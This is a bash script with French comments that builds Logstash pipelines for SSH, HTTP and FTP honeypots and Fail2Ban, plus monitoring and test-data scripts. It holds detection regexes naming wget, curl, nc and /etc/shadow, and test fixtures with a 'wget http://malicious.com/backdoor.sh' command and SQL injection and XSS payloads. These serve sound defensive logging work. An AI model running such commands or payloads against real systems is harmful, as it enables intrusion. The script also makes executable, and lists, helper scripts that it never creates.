#!/bin/bash
# scripts/elk/configure_logstash_pipelines.sh
# Création des pipelines Logstash pour tous les honeypots
# Étape 5.5 du projet - Version complète et optimisée

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

print_status() {
    echo -e "${GREEN}[+] $1${NC}"
}

print_warning() {
    echo -e "${YELLOW}[!] $1${NC}"
}

print_error() {
    echo -e "${RED}[-] $1${NC}"
}

print_info() {
    echo -e "${BLUE}[i] $1${NC}"
}

if [ "$EUID" -ne 0 ]; then
    print_error "Ce script doit être exécuté en tant que root sur la VM ELK (192.168.2.124)"
    exit 1
fi

print_status "=== Développement des pipelines Logstash pour Honeypots ==="
echo ""

# ================================
# NETTOYAGE ET PRÉPARATIFS
# ================================

print_status "Nettoyage complet de la configuration existante..."

# Arrêter Logstash pour éviter les conflits
print_info "Arrêt de Logstash..."
systemctl stop logstash 2>/dev/null || true

# Attendre l'arrêt complet
sleep 5

# Vérifier que Logstash est bien arrêté
if systemctl is-active logstash >/dev/null 2>&1; then
    print_warning "Logstash encore actif, arrêt forcé..."
    systemctl kill logstash
    sleep 3
fi

print_status "✓ Logstash arrêté"

# Créer les répertoires nécessaires
mkdir -p /etc/logstash/conf.d
mkdir -p /var/lib/logstash
mkdir -p /opt/elk-scripts
mkdir -p /var/log/elk-setup

# Sauvegarde complète de l'ancienne configuration
BACKUP_DIR="/var/log/elk-setup/backups"
mkdir -p "$BACKUP_DIR"

if [ -d "/etc/logstash/conf.d" ] && [ "$(ls -A /etc/logstash/conf.d 2>/dev/null)" ]; then
    BACKUP_FILE="$BACKUP_DIR/logstash-conf-backup-$(date +%Y%m%d_%H%M%S).tar.gz"
    print_warning "Sauvegarde de l'ancienne configuration vers: $BACKUP_FILE"
    tar -czf "$BACKUP_FILE" /etc/logstash/conf.d/ 2>/dev/null || true
    
    # Lister les fichiers qui vont être supprimés
    print_info "Fichiers de configuration existants à supprimer:"
    ls -la /etc/logstash/conf.d/ 2>/dev/null || echo "  Aucun fichier trouvé"
    
    # Nettoyage complet des anciens pipelines
    print_status "Suppression des anciens pipelines..."
    rm -f /etc/logstash/conf.d/*.conf
    rm -f /etc/logstash/conf.d/*.yml 
    rm -f /etc/logstash/conf.d/*.yaml
    rm -f /etc/logstash/conf.d/.conf*
else
    print_info "Aucune configuration existante trouvée"
fi

# Nettoyer les anciens fichiers sincedb (positions de lecture)
print_status "Nettoyage des fichiers sincedb..."
if [ -d "/var/lib/logstash" ]; then
    rm -f /var/lib/logstash/sincedb_*
    print_status "✓ Fichiers sincedb nettoyés"
fi

# Nettoyer les anciens logs Logstash
print_status "Nettoyage des anciens logs Logstash..."
if [ -d "/var/log/logstash" ]; then
    find /var/log/logstash -name "*.log" -mtime +1 -delete 2>/dev/null || true
    print_status "✓ Anciens logs supprimés"
fi

# Nettoyer les anciens scripts de monitoring s'ils existent
if [ -d "/opt/elk-scripts" ]; then
    print_info "Nettoyage des anciens scripts..."
    rm -f /opt/elk-scripts/*pipeline*
    rm -f /opt/elk-scripts/*logstash*
    rm -f /opt/elk-scripts/*test*
fi

# Vérifier qu'Elasticsearch est toujours accessible
print_status "Vérification de la connectivité Elasticsearch..."
if curl -s "http://192.168.2.124:9200" >/dev/null 2>&1; then
    ES_STATUS=$(curl -s "http://192.168.2.124:9200/_cluster/health" | jq -r '.status' 2>/dev/null || echo "unknown")
    print_status "✓ Elasticsearch accessible (statut: $ES_STATUS)"
else
    print_error "✗ Elasticsearch non accessible - Vérifiez le service"
    print_warning "Continuons quand même la configuration des pipelines..."
fi

print_status "✓ Nettoyage complet terminé - Configuration propre prête"

# Afficher un résumé du nettoyage
echo ""
print_info "📋 RÉSUMÉ DU NETTOYAGE:"
echo "   • Configuration Logstash: Nettoyée"
echo "   • Fichiers sincedb: Réinitialisés"
echo "   • Anciens logs: Purgés"
echo "   • Scripts: Nettoyés"
echo "   • Sauvegarde: $BACKUP_FILE"
echo ""

# ================================
# PIPELINE INPUT: BEATS RECEIVER
# ================================

print_status "Création de l'input Beats (port 5044)..."

cat > /etc/logstash/conf.d/00-beats-input.conf << 'EOF'
# Input principal pour recevoir les données de Filebeat depuis les honeypots
input {
  beats {
    port => 5044
    host => "192.168.2.124"
    type => "beats"
  }
}
EOF

print_status "✓ Input Beats configuré sur port 5044"

# ================================
# PIPELINE 1: COWRIE SSH HONEYPOT
# ================================

print_status "Création du pipeline Cowrie SSH..."

cat > /etc/logstash/conf.d/10-cowrie-ssh.conf << 'EOF'
# Pipeline pour Cowrie SSH Honeypot
filter {
  if [honeypot_type] == "ssh" {
    # Parse timestamp si présent
    if [timestamp] {
      date {
        match => [ "timestamp", "ISO8601" ]
      }
    }
    
    # Ajouter des métadonnées
    mutate {
      add_field => { "infrastructure" => "honeypot" }
      add_field => { "service" => "cowrie" }
      add_field => { "honeypot_service" => "cowrie" }
    }
    
    # GeoIP enrichissement sur IP source
    if [src_ip] {
      geoip {
        source => "src_ip"
        target => "geoip"
        add_field => { "src_country" => "%{[geoip][country_name]}" }
        add_field => { "src_city" => "%{[geoip][city_name]}" }
      }
    }
    
    # Classification des événements SSH selon eventid Cowrie
    if [eventid] == "cowrie.login.success" {
      mutate { 
        add_field => { "event_category" => "authentication_success" }
        add_field => { "severity" => "critical" }
        add_field => { "alert_level" => "4" }
        add_field => { "attack_phase" => "initial_access" }
      }
    } else if [eventid] == "cowrie.login.failed" {
      mutate { 
        add_field => { "event_category" => "authentication_failure" }
        add_field => { "severity" => "medium" }
        add_field => { "alert_level" => "2" }
        add_field => { "attack_phase" => "reconnaissance" }
      }
    } else if [eventid] == "cowrie.command.input" {
      mutate { 
        add_field => { "event_category" => "command_execution" }
        add_field => { "severity" => "high" }
        add_field => { "alert_level" => "3" }
        add_field => { "attack_phase" => "execution" }
      }
      
      # Détecter les commandes suspectes
      if [input] {
        if [input] =~ /(?i)(wget|curl|nc|netcat|nmap)/ {
          mutate { 
            add_field => { "suspicious_command" => "true" }
            add_field => { "command_type" => "network_tool" }
            add_field => { "severity" => "critical" }
          }
        } else if [input] =~ /(?i)(cat \/etc\/passwd|\/etc\/shadow|whoami|id|uname)/ {
          mutate { 
            add_field => { "suspicious_command" => "true" }
            add_field => { "command_type" => "system_enumeration" }
          }
        } else if [input] =~ /(?i)(python|perl|bash|sh|\.py|\.sh)/ {
          mutate { 
            add_field => { "suspicious_command" => "true" }
            add_field => { "command_type" => "script_execution" }
          }
        }
      }
    } else if [eventid] == "cowrie.session.file_download" {
      mutate { 
        add_field => { "event_category" => "file_download" }
        add_field => { "severity" => "critical" }
        add_field => { "alert_level" => "4" }
        add_field => { "attack_phase" => "exfiltration" }
      }
    } else if [eventid] == "cowrie.session.file_upload" {
      mutate { 
        add_field => { "event_category" => "file_upload" }
        add_field => { "severity" => "critical" }
        add_field => { "alert_level" => "4" }
        add_field => { "attack_phase" => "delivery" }
      }
    } else if [eventid] =~ /cowrie\.session/ {
      mutate { 
        add_field => { "event_category" => "session_management" }
        add_field => { "severity" => "low" }
        add_field => { "alert_level" => "1" }
      }
    }
    
    # Enrichissement session
    if [session] {
      mutate {
        add_field => { "session_id" => "%{session}" }
      }
    }
    
    # Détection de mots de passe communs
    if [password] {
      if [password] in ["123456", "password", "admin", "root", "123123", "qwerty"] {
        mutate {
          add_field => { "common_password" => "true" }
        }
      }
    }
  }
}

output {
  if [honeypot_type] == "ssh" {
    elasticsearch {
      hosts => ["192.168.2.124:9200"]
      index => "honeypot-cowrie-%{+YYYY.MM.dd}"
    }
  }
}
EOF

print_status "✓ Pipeline Cowrie SSH créé avec détection avancée"

# ================================
# PIPELINE 2: HTTP HONEYPOT
# ================================

print_status "Création du pipeline HTTP Honeypot..."

cat > /etc/logstash/conf.d/20-http-honeypot.conf << 'EOF'
# Pipeline pour HTTP Honeypot personnalisé
filter {
  if [honeypot_type] == "http" {
    # Parse timestamp
    if [timestamp] {
      date {
        match => [ "timestamp", "ISO8601" ]
      }
    }
    
    # Ajouter des métadonnées
    mutate {
      add_field => { "infrastructure" => "honeypot" }
      add_field => { "service" => "http_honeypot" }
    }
    
    # Normalisation des champs IP
    if [ip] and ![src_ip] {
      mutate {
        add_field => { "src_ip" => "%{ip}" }
      }
    }
    
    # GeoIP enrichissement
    if [src_ip] {
      geoip {
        source => "src_ip"
        target => "geoip"
        add_field => { "src_country" => "%{[geoip][country_name]}" }
        add_field => { "src_city" => "%{[geoip][city_name]}" }
      }
    }
    
    # Classification des attaques HTTP par type
    if [attack_type] == "sql_injection" or [attack_category] == "sql_injection" {
      mutate { 
        add_field => { "event_category" => "sql_injection" }
        add_field => { "severity" => "high" }
        add_field => { "alert_level" => "3" }
        add_field => { "attack_vector" => "web_application" }
        add_field => { "mitre_technique" => "T1190" }
      }
    } else if [attack_type] == "xss" or [attack_category] == "xss" {
      mutate { 
        add_field => { "event_category" => "cross_site_scripting" }
        add_field => { "severity" => "medium" }
        add_field => { "alert_level" => "2" }
        add_field => { "attack_vector" => "web_application" }
        add_field => { "mitre_technique" => "T1059" }
      }
    } else if [attack_type] == "path_traversal" or [attack_category] == "path_traversal" {
      mutate { 
        add_field => { "event_category" => "directory_traversal" }
        add_field => { "severity" => "high" }
        add_field => { "alert_level" => "3" }
        add_field => { "attack_vector" => "web_application" }
        add_field => { "mitre_technique" => "T1083" }
      }
    } else if [attack_type] == "file_upload" or [attack_category] == "file_upload" {
      mutate { 
        add_field => { "event_category" => "malicious_file_upload" }
        add_field => { "severity" => "critical" }
        add_field => { "alert_level" => "4" }
        add_field => { "attack_vector" => "web_application" }
        add_field => { "mitre_technique" => "T1105" }
      }
    } else if [attack_type] == "command_injection" {
      mutate { 
        add_field => { "event_category" => "command_injection" }
        add_field => { "severity" => "critical" }
        add_field => { "alert_level" => "4" }
        add_field => { "attack_vector" => "web_application" }
        add_field => { "mitre_technique" => "T1059" }
      }
    } else {
      mutate { 
        add_field => { "event_category" => "web_probe" }
        add_field => { "severity" => "low" }
        add_field => { "alert_level" => "1" }
      }
    }
    
    # Détection User-Agent suspects
    if [user_agent] {
      if [user_agent] =~ /(?i)(sqlmap|nikto|nmap|masscan|zap|burp|dirb|gobuster)/ {
        mutate {
          add_field => { "scanner_detected" => "true" }
          add_field => { "tool_detected" => "security_scanner" }
          add_field => { "severity" => "medium" }
        }
      } else if [user_agent] =~ /(?i)(bot|crawler|spider|scan)/ {
        mutate {
          add_field => { "automated_tool" => "true" }
        }
      }
    }
    
    # Analyse des payloads
    if [payload] {
      if [payload] =~ /(?i)(union\s+select|or\s+1=1|drop\s+table)/ {
        mutate {
          add_field => { "sql_injection_payload" => "true" }
        }
      }
      
      if [payload] =~ /(?i)(<script|javascript:|onload=|onerror=)/ {
        mutate {
          add_field => { "xss_payload" => "true" }
        }
      }
      
      if [payload] =~ /(?i)(\.\.\/|\.\.\\|\/etc\/passwd|\/windows\/system32)/ {
        mutate {
          add_field => { "traversal_payload" => "true" }
        }
      }
    }
    
    # Analyse des URLs suspectes
    if [url] {
      if [url] =~ /(?i)(admin|wp-admin|phpmyadmin|login|config)/ {
        mutate {
          add_field => { "admin_path_probe" => "true" }
        }
      }
    }
  }
}

output {
  if [honeypot_type] == "http" {
    elasticsearch {
      hosts => ["192.168.2.124:9200"]
      index => "honeypot-http-%{+YYYY.MM.dd}"
    }
  }
}
EOF

print_status "✓ Pipeline HTTP créé avec détection avancée d'attaques web"

# ================================
# PIPELINE 3: FTP HONEYPOT
# ================================

print_status "Création du pipeline FTP Honeypot..."

cat > /etc/logstash/conf.d/30-ftp-honeypot.conf << 'EOF'
# Pipeline pour FTP Honeypot personnalisé
filter {
  if [honeypot_type] == "ftp" {
    # Parse timestamp
    if [timestamp] {
      date {
        match => [ "timestamp", "ISO8601" ]
      }
    }
    
    # Ajouter des métadonnées
    mutate {
      add_field => { "infrastructure" => "honeypot" }
      add_field => { "service" => "ftp_honeypot" }
    }
    
    # Normalisation IP
    if [ip] and ![src_ip] {
      mutate {
        add_field => { "src_ip" => "%{ip}" }
      }
    }
    
    # GeoIP enrichissement
    if [src_ip] {
      geoip {
        source => "src_ip"
        target => "geoip"
        add_field => { "src_country" => "%{[geoip][country_name]}" }
        add_field => { "src_city" => "%{[geoip][city_name]}" }
      }
    }
    
    # Classification des événements FTP
    if [event_type] == "auth_attempt" {
      if [success] == true {
        mutate { 
          add_field => { "event_category" => "authentication_success" }
          add_field => { "severity" => "critical" }
          add_field => { "alert_level" => "4" }
          add_field => { "attack_phase" => "initial_access" }
        }
      } else {
        mutate { 
          add_field => { "event_category" => "authentication_failure" }
          add_field => { "severity" => "medium" }
          add_field => { "alert_level" => "2" }
          add_field => { "attack_phase" => "reconnaissance" }
        }
      }
    } else if [event_type] == "directory_traversal" {
      mutate { 
        add_field => { "event_category" => "directory_traversal" }
        add_field => { "severity" => "high" }
        add_field => { "alert_level" => "3" }
        add_field => { "mitre_technique" => "T1083" }
      }
    } else if [event_type] == "file_upload" {
      mutate { 
        add_field => { "event_category" => "file_upload" }
        add_field => { "severity" => "high" }
        add_field => { "alert_level" => "3" }
        add_field => { "attack_phase" => "delivery" }
        add_field => { "mitre_technique" => "T1105" }
      }
    } else if [event_type] == "file_download" {
      mutate { 
        add_field => { "event_category" => "file_download" }
        add_field => { "severity" => "medium" }
        add_field => { "alert_level" => "2" }
        add_field => { "attack_phase" => "collection" }
      }
    } else if [event_type] == "vulnerability_test" {
      mutate { 
        add_field => { "event_category" => "vulnerability_probe" }
        add_field => { "severity" => "high" }
        add_field => { "alert_level" => "3" }
        add_field => { "attack_phase" => "reconnaissance" }
      }
    } else if [event_type] == "command_injection" {
      mutate { 
        add_field => { "event_category" => "command_injection" }
        add_field => { "severity" => "critical" }
        add_field => { "alert_level" => "4" }
        add_field => { "mitre_technique" => "T1059" }
      }
    } else {
      mutate { 
        add_field => { "event_category" => "ftp_activity" }
        add_field => { "severity" => "low" }
        add_field => { "alert_level" => "1" }
      }
    }
    
    # Analyse des commandes FTP
    if [command] {
      if [command] in ["SITE EXEC", "SITE CHMOD", "SITE RMDIR"] {
        mutate {
          add_field => { "dangerous_command" => "true" }
          add_field => { "severity" => "high" }
        }
      }
    }
    
    # Analyse des noms de fichiers suspects
    if [filename] {
      if [filename] =~ /(?i)(\.php|\.asp|\.jsp|\.exe|\.bat|\.sh|backdoor|shell|webshell)/ {
        mutate {
          add_field => { "suspicious_file" => "true" }
          add_field => { "malicious_file" => "true" }
        }
      }
    }
    
    # Détection de mots de passe communs
    if [password] {
      if [password] in ["ftp", "anonymous", "admin", "password", "123456", "root"] {
        mutate {
          add_field => { "common_password" => "true" }
        }
      }
    }
  }
}

output {
  if [honeypot_type] == "ftp" {
    elasticsearch {
      hosts => ["192.168.2.124:9200"]
      index => "honeypot-ftp-%{+YYYY.MM.dd}"
    }
  }
}
EOF

print_status "✓ Pipeline FTP créé avec détection de vulnérabilités"

# ================================
# PIPELINE 4: SERVEURS SÉCURISÉS
# ================================

print_status "Création du pipeline serveurs sécurisés..."

cat > /etc/logstash/conf.d/40-secure-servers.conf << 'EOF'
# Pipeline pour logs des serveurs sécurisés
filter {
  if [honeypot_type] == "system" or [infrastructure] == "secure_server" {
    # Parse syslog timestamp
    if [message] {
      grok {
        match => { "message" => "%{SYSLOGTIMESTAMP:syslog_timestamp} %{IPORHOST:host} %{PROG:program}(?:\[%{POSINT:pid}\])?: %{GREEDYDATA:log_message}" }
      }
      
      # Parse timestamp syslog
      if [syslog_timestamp] {
        date {
          match => [ "syslog_timestamp", "MMM  d HH:mm:ss", "MMM dd HH:mm:ss" ]
        }
      }
    }
    
    # Ajouter métadonnées
    mutate {
      add_field => { "infrastructure" => "secure_server" }
      add_field => { "service" => "system" }
    }
    
    # Classification des événements système
    if [program] == "sshd" {
      if [log_message] =~ /Failed password/ {
        mutate {
          add_field => { "event_category" => "authentication_failure" }
          add_field => { "severity" => "medium" }
          add_field => { "service_type" => "ssh" }
        }
        
        # Extraire l'IP
        grok {
          match => { "log_message" => "Failed password for %{USERNAME:username} from %{IPORHOST:src_ip}" }
        }
      } else if [log_message] =~ /Accepted password/ {
        mutate {
          add_field => { "event_category" => "authentication_success" }
          add_field => { "severity" => "low" }
          add_field => { "service_type" => "ssh" }
        }
        
        grok {
          match => { "log_message" => "Accepted password for %{USERNAME:username} from %{IPORHOST:src_ip}" }
        }
      }
    } else if [program] == "vsftpd" {
      mutate {
        add_field => { "service_type" => "ftp" }
      }
    }
    
    # GeoIP sur IP extraite
    if [src_ip] {
      geoip {
        source => "src_ip"
        target => "geoip"
        add_field => { "src_country" => "%{[geoip][country_name]}" }
      }
    }
  }
}

output {
  if [infrastructure] == "secure_server" {
    elasticsearch {
      hosts => ["192.168.2.124:9200"]
      index => "secure-servers-%{+YYYY.MM.dd}"
    }
  }
}
EOF

print_status "✓ Pipeline serveurs sécurisés créé"

# ================================
# PIPELINE 5: FAIL2BAN MONITORING
# ================================

print_status "Création du pipeline Fail2Ban..."

cat > /etc/logstash/conf.d/50-fail2ban.conf << 'EOF'
# Pipeline pour logs Fail2Ban
filter {
  if [fields][log_type] == "fail2ban" or [program] == "fail2ban.actions" {
    mutate {
      add_field => { "infrastructure" => "security" }
      add_field => { "service" => "fail2ban" }
    }
    
    # Parse les actions Fail2Ban
    if [message] =~ /NOTICE.*Ban/ {
      mutate {
        add_field => { "event_category" => "ip_banned" }
        add_field => { "severity" => "medium" }
        add_field => { "alert_level" => "2" }
      }
      
      grok {
        match => { "message" => "Ban %{IPORHOST:banned_ip}" }
      }
    } else if [message] =~ /NOTICE.*Unban/ {
      mutate {
        add_field => { "event_category" => "ip_unbanned" }
        add_field => { "severity" => "low" }
      }
      
      grok {
        match => { "message" => "Unban %{IPORHOST:unbanned_ip}" }
      }
    }
  }
}

output {
  if [service] == "fail2ban" {
    elasticsearch {
      hosts => ["192.168.2.124:9200"]
      index => "security-fail2ban-%{+YYYY.MM.dd}"
    }
  }
}
EOF

print_status "✓ Pipeline Fail2Ban créé"

# ================================
# VALIDATION DES PIPELINES
# ================================

print_status "Validation de la syntaxe des pipelines..."

# Test de configuration
if sudo -u logstash /usr/share/logstash/bin/logstash --path.settings /etc/logstash -t; then
    print_status "✓ Configuration des pipelines validée avec succès"
else
    print_error "✗ Erreur dans la configuration des pipelines"
    print_error "Vérifiez les logs: journalctl -u logstash"
    exit 1
fi

# ================================
# SCRIPTS DE MONITORING
# ================================

print_status "Création des scripts de monitoring..."

# Script de monitoring général
cat > /opt/elk-scripts/monitor_pipelines.sh << 'EOF'
#!/bin/bash
echo "=== Monitoring Pipelines Logstash ==="
echo "Date: $(date)"
echo ""

echo "1. Service Status:"
echo "   Logstash: $(systemctl is-active logstash)"
echo "   Elasticsearch: $(systemctl is-active elasticsearch)"

echo ""
echo "2. Configuration:"
echo "   Fichiers: $(ls -1 /etc/logstash/conf.d/*.conf | wc -l) pipelines"
ls -la /etc/logstash/conf.d/

echo ""
echo "3. API Logstash:"
if curl -s "http://192.168.2.124:9600/" >/dev/null 2>&1; then
    echo "   Status: $(curl -s "http://192.168.2.124:9600/" | jq -r .status)"
    echo "   Version: $(curl -s "http://192.168.2.124:9600/" | jq -r .version)"
else
    echo "   Status: API non accessible"
fi

echo ""
echo "4. Pipelines actifs:"
curl -s "http://192.168.2.124:9600/_node/pipelines" 2>/dev/null | jq keys || echo "   Aucun pipeline actif"

echo ""
echo "5. Statistiques événements:"
curl -s "http://192.168.2.124:9600/_node/stats/pipelines" 2>/dev/null | jq '.pipelines.main.events' || echo "   Stats non disponibles"

echo ""
echo "6. Indices Elasticsearch:"
curl -s "http://192.168.2.124:9200/_cat/indices/honeypot-*,secure-*?h=index,docs.count,store.size" 2>/dev/null || echo "   ES non accessible"

echo ""
echo "7. Derniers logs Logstash:"
journalctl -u logstash --no-pager -n 5
EOF

chmod +x /opt/elk-scripts/start_logstash_safe.sh

# ================================
# CRÉATION D'UN PIPELINE DE DEBUG
# ================================

print_status "Création du pipeline de debug..."

cat > /etc/logstash/conf.d/99-debug.conf << 'EOF'
# Pipeline de debug pour tracer les événements non matchés
filter {
  if ![honeypot_type] and ![infrastructure] and ![service] {
    mutate {
      add_field => { "debug" => "unmatched_event" }
      add_field => { "pipeline_debug" => "true" }
    }
  }
}

output {
  if [pipeline_debug] == "true" {
    elasticsearch {
      hosts => ["192.168.2.124:9200"]
      index => "debug-unmatched-%{+YYYY.MM.dd}"
    }
  }
}
EOF

print_status "✓ Pipeline de debug créé"

# ================================
# CONFIGURATION DES PERMISSIONS
# ================================

print_status "Configuration des permissions..."

# Assurer les bonnes permissions
chown -R logstash:logstash /var/lib/logstash
chmod 755 /etc/logstash/conf.d
chmod 644 /etc/logstash/conf.d/*.conf

# Créer les répertoires de logs attendus s'ils n'existent pas
mkdir -p /var/log/cowrie
mkdir -p /var/log/honeypot
mkdir -p /root/honeypot-ftp/logs
mkdir -p /var/log/fail2ban

# Permissions pour que Logstash puisse lire les logs
chgrp logstash /var/log/cowrie /var/log/honeypot /root/honeypot-ftp/logs 2>/dev/null || true
chmod g+r /var/log/cowrie/* /var/log/honeypot/* /root/honeypot-ftp/logs/* 2>/dev/null || true

print_status "✓ Permissions configurées"

# ================================
# OPTIMISATION LOGSTASH
# ================================

print_status "Optimisation de la configuration Logstash..."

# Sauvegarder la config originale
cp /etc/logstash/logstash.yml /etc/logstash/logstash.yml.backup

# Configuration optimisée pour les honeypots
cat >> /etc/logstash/logstash.yml << 'EOF'

# Optimisations pour environnement honeypot
pipeline.workers: 2
pipeline.batch.size: 500
pipeline.batch.delay: 50

# Configuration réseau
http.host: "192.168.2.124"
http.port: 9600

# Logging
log.level: info
path.logs: /var/log/logstash

# Monitoring
monitoring.enabled: true
monitoring.elasticsearch.hosts: ["http://192.168.2.124:9200"]

# Performance
queue.type: memory
queue.max_events: 2000
EOF

print_status "✓ Configuration Logstash optimisée"

# ================================
# SCRIPT D'ANALYSE DES PATTERNS
# ================================

print_status "Création du script d'analyse des patterns..."

cat > /opt/elk-scripts/analyze_attack_patterns.sh << 'EOF'
#!/bin/bash
echo "=== Analyse des Patterns d'Attaques ==="
echo "Date: $(date)"
echo ""

ES_URL="http://192.168.2.124:9200"

echo "1. TOP 10 IP ATTAQUANTES (dernières 24h):"
curl -s -X GET "$ES_URL/honeypot-*/_search" -H 'Content-Type: application/json' -d'
{
  "size": 0,
  "query": {
    "range": {
      "@timestamp": {
        "gte": "now-24h"
      }
    }
  },
  "aggs": {
    "top_ips": {
      "terms": {
        "field": "src_ip",
        "size": 10
      }
    }
  }
}' | jq '.aggregations.top_ips.buckets[] | {ip: .key, count: .doc_count}' 2>/dev/null || echo "Pas de données disponibles"

echo ""
echo "2. RÉPARTITION PAR PAYS:"
curl -s -X GET "$ES_URL/honeypot-*/_search" -H 'Content-Type: application/json' -d'
{
  "size": 0,
  "query": {
    "range": {
      "@timestamp": {
        "gte": "now-24h"
      }
    }
  },
  "aggs": {
    "countries": {
      "terms": {
        "field": "src_country",
        "size": 5
      }
    }
  }
}' | jq '.aggregations.countries.buckets[] | {country: .key, attacks: .doc_count}' 2>/dev/null || echo "Pas de données géographiques"

echo ""
echo "3. TYPES D'ATTAQUES LES PLUS FRÉQUENTS:"
curl -s -X GET "$ES_URL/honeypot-*/_search" -H 'Content-Type: application/json' -d'
{
  "size": 0,
  "query": {
    "range": {
      "@timestamp": {
        "gte": "now-24h"
      }
    }
  },
  "aggs": {
    "attack_types": {
      "terms": {
        "field": "event_category",
        "size": 10
      }
    }
  }
}' | jq '.aggregations.attack_types.buckets[] | {attack: .key, count: .doc_count}' 2>/dev/null || echo "Pas de données d'attaques"

echo ""
echo "4. RÉPARTITION PAR HONEYPOT:"
curl -s -X GET "$ES_URL/honeypot-*/_search" -H 'Content-Type: application/json' -d'
{
  "size": 0,
  "query": {
    "range": {
      "@timestamp": {
        "gte": "now-24h"
      }
    }
  },
  "aggs": {
    "honeypots": {
      "terms": {
        "field": "honeypot_type",
        "size": 10
      }
    }
  }
}' | jq '.aggregations.honeypots.buckets[] | {honeypot: .key, events: .doc_count}' 2>/dev/null || echo "Pas de données par honeypot"

echo ""
echo "5. ALERTES CRITIQUES (niveau 4):"
curl -s -X GET "$ES_URL/honeypot-*/_search" -H 'Content-Type: application/json' -d'
{
  "size": 5,
  "query": {
    "bool": {
      "must": [
        {
          "range": {
            "@timestamp": {
              "gte": "now-24h"
            }
          }
        },
        {
          "term": {
            "alert_level": 4
          }
        }
      ]
    }
  },
  "sort": [
    {
      "@timestamp": {
        "order": "desc"
      }
    }
  ]
}' | jq '.hits.hits[]._source | {timestamp: ."@timestamp", honeypot: .honeypot_type, ip: .src_ip, category: .event_category}' 2>/dev/null || echo "Pas d'alertes critiques"
EOF

chmod +x /opt/elk-scripts/analyze_attack_patterns.sh

# ================================
# GÉNÉRATEUR DE DONNÉES DE TEST
# ================================

print_status "Création du générateur de données de test..."

cat > /opt/elk-scripts/generate_test_data.sh << 'EOF'
#!/bin/bash
echo "=== Générateur de Données de Test pour Honeypots ==="

# Répertoires de test
mkdir -p /tmp/honeypot-test-data

# IPs de test (plages publiques de documentation)
TEST_IPS=("203.0.113.10" "198.51.100.25" "192.0.2.100" "203.0.113.200" "198.51.100.150")

# Fonction pour timestamp actuel
get_timestamp() {
    date -u +%Y-%m-%dT%H:%M:%S.%3NZ
}

# Fonction pour IP aléatoire
get_random_ip() {
    echo ${TEST_IPS[$RANDOM % ${#TEST_IPS[@]}]}
}

echo "Génération de données de test SSH (Cowrie)..."
for i in {1..5}; do
    cat >> /tmp/honeypot-test-data/cowrie-test.json << EOF
{"timestamp":"$(get_timestamp)","eventid":"cowrie.login.failed","src_ip":"$(get_random_ip)","username":"admin","password":"123456","protocol":"ssh","honeypot_type":"ssh","session":"$(uuidgen)"}
{"timestamp":"$(get_timestamp)","eventid":"cowrie.command.input","src_ip":"$(get_random_ip)","input":"wget http://malicious.com/backdoor.sh","protocol":"ssh","honeypot_type":"ssh","session":"$(uuidgen)"}
EOF
done

echo "Génération de données de test HTTP..."
for i in {1..5}; do
    cat >> /tmp/honeypot-test-data/http-test.json << EOF
{"timestamp":"$(get_timestamp)","ip":"$(get_random_ip)","attack_type":"sql_injection","payload":"' UNION SELECT * FROM users--","url":"/login.php","honeypot_type":"http","user_agent":"sqlmap/1.0"}
{"timestamp":"$(get_timestamp)","ip":"$(get_random_ip)","attack_type":"xss","payload":"<script>alert('XSS')</script>","url":"/search.php","honeypot_type":"http","user_agent":"Mozilla/5.0"}
EOF
done

echo "Génération de données de test FTP..."
for i in {1..5}; do
    cat >> /tmp/honeypot-test-data/ftp-test.json << EOF
{"timestamp":"$(get_timestamp)","event_type":"auth_attempt","success":false,"src_ip":"$(get_random_ip)","username":"anonymous","password":"test@test.com","honeypot_type":"ftp","session_id":"$(uuidgen)"}
{"timestamp":"$(get_timestamp)","event_type":"file_upload","success":true,"src_ip":"$(get_random_ip)","filename":"backdoor.php","filesize":2048,"honeypot_type":"ftp","session_id":"$(uuidgen)"}
EOF
done

echo ""
echo "✓ Données de test générées dans /tmp/honeypot-test-data/"
echo ""
echo "Pour injecter dans Elasticsearch via Logstash:"
echo "1. Copiez les fichiers vers les répertoires surveillés"
echo "2. Ou utilisez l'API Elasticsearch directement"
echo ""
echo "Fichiers créés:"
ls -la /tmp/honeypot-test-data/

echo ""
echo "Exemple d'injection directe:"
echo "curl -X POST 'http://192.168.2.124:9200/honeypot-cowrie-$(date +%Y.%m.%d)/_doc' -H 'Content-Type: application/json' -d @/tmp/honeypot-test-data/cowrie-test.json"
EOF

chmod +x /opt/elk-scripts/generate_test_data.sh

# ================================
# VALIDATION FINALE ET RÉSUMÉ
# ================================

print_status "Validation finale de la configuration..."

# Compter les pipelines créés
PIPELINE_COUNT=$(ls -1 /etc/logstash/conf.d/*.conf | wc -l)

# Test final de syntaxe
if sudo -u logstash /usr/share/logstash/bin/logstash --path.settings /etc/logstash -t; then
    print_status "✅ Validation finale réussie - $PIPELINE_COUNT pipelines créés"
else
    print_error "❌ Erreur dans la validation finale"
    exit 1
fi

print_status "=== Pipelines Logstash créés avec succès! ==="
echo ""
print_info "📊 PIPELINES CRÉÉS ($PIPELINE_COUNT fichiers):"
echo "   ✓ 00-beats-input.conf       (Réception Filebeat port 5044)"
echo "   ✓ 10-cowrie-ssh.conf        (SSH Honeypot avec détection avancée)"
echo "   ✓ 20-http-honeypot.conf     (HTTP avec classification MITRE ATT&CK)"
echo "   ✓ 30-ftp-honeypot.conf      (FTP avec détection de vulnérabilités)"
echo "   ✓ 40-secure-servers.conf    (Logs des serveurs sécurisés)"
echo "   ✓ 50-fail2ban.conf          (Monitoring Fail2Ban)"
echo "   ✓ 99-debug.conf             (Debug des événements non matchés)"
echo ""
print_info "🎯 FONCTIONNALITÉS AVANCÉES:"
echo "   • GeoIP enrichissement automatique"
echo "   • Classification par sévérité (low/medium/high/critical)"
echo "   • Niveaux d'alerte (1-4)"
echo "   • Mapping MITRE ATT&CK techniques"
echo "   • Détection de patterns d'attaque"
echo "   • Support User-Agent analysis"
echo "   • Détection de payloads malicieux"
echo ""
print_info "📈 INDICES ELASTICSEARCH:"
echo "   → honeypot-cowrie-YYYY.MM.dd"
echo "   → honeypot-http-YYYY.MM.dd"
echo "   → honeypot-ftp-YYYY.MM.dd"
echo "   → secure-servers-YYYY.MM.dd"
echo "   → security-fail2ban-YYYY.MM.dd"
echo "   → debug-unmatched-YYYY.MM.dd"
echo ""
print_info "🛠️ SCRIPTS DISPONIBLES:"
echo "   • /opt/elk-scripts/monitor_pipelines.sh (monitoring général)"
echo "   • /opt/elk-scripts/test_pipelines.sh (test des pipelines)"
echo "   • /opt/elk-scripts/start_logstash_safe.sh (démarrage sécurisé)"
